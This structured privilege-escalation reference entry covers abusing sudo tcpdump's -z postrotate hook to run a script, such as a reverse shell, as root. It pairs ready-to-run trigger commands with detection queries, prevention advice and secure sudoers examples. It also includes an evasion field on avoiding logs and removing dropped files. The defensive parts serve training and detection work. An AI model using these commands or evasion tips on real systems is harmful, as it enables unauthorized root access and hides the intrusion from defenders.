notes: tcpdump's -z runs a command on each rotated file as the -Z user (root). -G 1 -W 1 forces one immediate rotation so the payload fires at once. OSCP Ch17: tcpdump sudo escape is blocked by AppArmor on Debian 10. Audit via /var/log/syslog | grep tcpdump -> apparmor='DENIED'. Check aa-status for the active profile list before attempting GTFOBins sudo escapes. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).

Payload options for the postrotate command.

name: Sudo Abuse - tcpdump postrotate Command
description: tcpdump's -z runs a command on each rotated file as root. If you can sudo tcpdump, point -z at a reverse-shell script to get a root shell.

steps.label: 3. Trigger via tcpdump -z
steps.command:
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
# full path variant: sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

defense.why_it_works: tcpdump supports a -z (postrotate-command) flag that executes a script after each rotation. When run with sudo, the -z argument calls the attacker's script as root. Combined with -G 1 (rotate every 1 second) and -W 1 (single rotation), tcpdump immediately executes the payload script as root without requiring any network capture to complete.
defense.prerequisites: sudo access to /usr/sbin/tcpdump. Attacker can write a payload script. Network interface access.
defense.impact: Arbitrary command execution as root via tcpdump's postrotate callback. Reverse shell, sudoers modification, SUID shell creation.
defense.detection: tcpdump executed via sudo with -z flag pointing to non-standard script. Unusual payload script in /tmp executed by tcpdump. Auditd: tcpdump spawning unexpected child process as root.
defense.artifacts: Sudo log: tcpdump with -z argument | Process tree: tcpdump -> attacker payload script -> reverse shell | Network connection from root process
defense.splunk_spl:
index=linux sourcetype="linux_secure" "sudo:" "tcpdump" "-z"
| table _time, host, user, _raw

index=linux sourcetype="linux:auditd" ppid_comm="tcpdump"
| where auid=0 AND NOT match(comm, "tcpdump")
| table _time, host, comm, proctitle
defense.sentinel_kql:
Syslog
| where SyslogMessage has "tcpdump" and SyslogMessage has "-z"
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// tcpdump -z postrotate script abused via sudo to run a payload as root
defense.prevention: Use AppArmor or SELinux profile to restrict tcpdump's capabilities even when run with sudo. If tcpdump must be in sudoers, restrict it to specific flags that exclude -z: use sudoers with argument matching. Avoid granting sudo tcpdump entirely -- prefer dedicated monitoring tools.
defense.misconfiguration: sudoers grants unrestricted sudo access to /usr/sbin/tcpdump without argument restrictions, allowing -z flag abuse.
defense.vulnerable_config:
# Vulnerable sudoers
htb-student ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump

# Exploit:
# echo 'bash reverse shell' > /tmp/.test
# sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
defense.secure_config:
# Option 1: Remove tcpdump from sudoers
# Use dedicated network monitoring solution instead

# Option 2: AppArmor profile to restrict tcpdump even in sudo
# /etc/apparmor.d/usr.sbin.tcpdump
# Deny exec of arbitrary files in postrotate

# Option 3: Sudo with command args locked down
htb-student ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump -i eth0 -n
defense.evasion: Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating.

explain:
Abuses tcpdump's post-rotate command hook to run a script as root:
  sudo tcpdump -ln -i eth0   capture on the interface
  -w /dev/null -W 1 -G 1   rotate the capture file every 1 second, keeping 1 file
  -z /tmp/.test            run this script on each rotated file (executed as root)
  -Z root                  drop privileges to root (so -z runs as root)
Point -z at a reverse-shell script and catch the root shell on your listener.
